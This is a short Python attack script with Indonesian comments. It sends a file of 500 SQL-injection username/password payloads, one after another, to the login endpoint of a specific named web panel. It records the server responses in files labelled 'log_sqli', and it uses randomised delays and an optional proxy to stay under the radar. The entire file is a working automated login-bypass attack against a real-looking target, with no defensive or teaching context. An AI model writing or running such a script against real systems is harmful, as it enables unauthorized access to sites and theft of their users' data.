import requests
import time
import random
import json

url = "https://h1-3.cbt8.my.id/panel/ceklogin.php"
headers = {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept": "*/*",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36"
}

# Kalau mau proxy aktifin ini
# proxies = {
#     "http": "http://IP_PROXY:PORT",
#     "https": "http://IP_PROXY:PORT"
# }

with open("payload_500.txt", "r") as f:
    lines = f.readlines()

log_txt = open("log_sqli.txt", "w")
log_json = []

for line in lines:
    parts = line.strip().split('|')
    if len(parts) != 2:
        continue
    usr = parts[0].strip()
    pwd = parts[1].strip()
    data = {
        "username": usr,
        "password": pwd
    }
    try:
        # r = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=10)
        r = requests.post(url, headers=headers, data=data, timeout=10)
        log_entry = {
            "status": r.status_code,
            "username": usr,
            "password": pwd,
            "response": r.text[:300]  # potong biar gak kepanjangan
        }
        output = f"[{r.status_code}] User: {usr} | Pass: {pwd}\nResponse: {r.text[:200]}\n"
        print(output)
        log_txt.write(output + "\n")
        log_json.append(log_entry)
    except Exception as e:
        error_msg = f"[!] ERROR: {e}\n"
        print(error_msg)
        log_txt.write(error_msg + "\n")
        log_json.append({"error": str(e)})

    time.sleep(random.uniform(1.5, 3.5))

log_txt.close()

with open("log_sqli.json", "w") as fjson:
    json.dump(log_json, fjson, indent=2)

print("✅ DONE duniakuuuu! Log saved: log_sqli.txt + log_sqli.json")
